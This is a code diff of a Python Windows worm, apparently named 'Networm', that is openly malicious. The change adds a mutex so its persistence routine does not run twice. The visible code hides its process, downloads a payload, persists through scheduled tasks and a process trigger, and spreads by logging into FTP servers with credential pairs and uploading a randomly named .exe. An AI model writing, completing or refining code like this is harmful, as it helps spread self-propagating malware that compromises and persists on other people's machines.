@@ -1,18 +1,15 @@
 import os
-import winreg
-import sys
 import random
 import string
 import psutil
 import subprocess
 import socket
-import threading
 import sys
 import requests
 import urllib3
 import ftplib
 import wmi
-from datetime import datetime
+import win32event
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -201,7 +198,7 @@ def ftp_spread():
                         ftp = ftplib.FTP(ip, timeout=1)
                         ftp.login(user, pwd)
                         random_name = f'{generate_random_name()}.exe'
-                        if os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
+                        if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
                         else: payload_path = download_payload()
                         if payload_path:
                             with open(payload_path, 'rb') as f:
@@ -254,9 +251,18 @@ def persist_process_trigger():
     except:
         pass
 
+# Mutex to prevent duplicate persistence
+def persist_mutex():
+    try:
+        mutex = win32event.CreateMutex(None, False, 'Global\\NetwormMutex')
+        if win32event.GetLastError() == 0:
+            persist_schtasks()
+            persist_process_trigger()
+    except:
+        pass
+
 if __name__ == "__main__":
     hide_process()
     download_payload()
-    persist_schtasks()
-    persist_process_trigger()
+    persist_mutex()
     ftp_spread()
